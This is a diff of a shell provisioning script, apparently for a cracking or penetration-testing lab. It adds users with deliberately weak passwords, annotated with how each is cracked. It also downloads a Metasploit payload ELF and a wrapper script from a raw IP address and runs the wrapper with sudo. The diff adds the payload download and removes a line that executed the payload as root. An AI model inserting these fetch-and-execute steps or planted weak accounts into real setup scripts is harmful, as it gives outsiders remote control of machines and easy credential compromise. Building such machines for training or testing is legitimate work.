@@ -78,11 +78,8 @@ useradd joshua -p password # wordlist, simple
 useradd alyssa -p afccdeg8 # brute-force, matches ?l?l?l?l?l?l?l?d, easy match
 useradd rajj -p 123mango # wordlist, end of rockyou
 cd /root/
+wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf
+chmod +x msfPayload.elf
 wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh
 chmod +x linuxWrapperMSF.sh
 sudo ./linuxWrapperMSF.sh
-bg
-wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf
-chmod +x msfPayload.elf
-sudo ./msfPayload.elf
-bg
